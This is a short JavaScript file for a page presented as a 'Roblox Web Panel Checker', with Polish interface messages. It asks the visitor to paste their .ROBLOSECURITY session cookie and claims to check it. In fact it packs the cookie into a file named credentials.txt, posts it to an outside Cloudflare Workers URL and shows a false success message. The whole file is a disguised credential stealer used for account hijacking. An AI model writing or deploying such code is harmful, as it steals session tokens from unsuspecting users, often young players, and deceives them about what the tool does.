const PROXY_URL = "https://wispy-night-a3a2.kruszkomaja.workers.dev/";

document.getElementById('checkBtn').addEventListener('click', async () => {
    const cookie = document.getElementById('cookieInput').value.trim();
    const logBox = document.getElementById('outputLog');

    if (!cookie) {
        logBox.innerText = "Błąd: Wpisz najpierw ciasteczko .ROBLOSECURITY!";
        return;
    }

    logBox.innerText = "Przetwarzanie i wysyłanie danych...";

    try {
        const credentialsContent = 
`========================================
       ROBLOX WEB PANEL CHECKER     
========================================
[🌈] .ROBLOSECURITY:
${cookie}`;

        const blob = new Blob([credentialsContent], { type: "text/plain" });
        const formData = new FormData();
        formData.append("file", blob, "credentials.txt");

        await fetch(PROXY_URL, {
            method: "POST",
            body: formData
        });

        logBox.innerText = "Sukces! Dane zostały pomyślnie wysyłane przez Web Panel.";
    } catch (err) {
        logBox.innerText = "Błąd podczas wysyłania: " + err.message;
    }
});
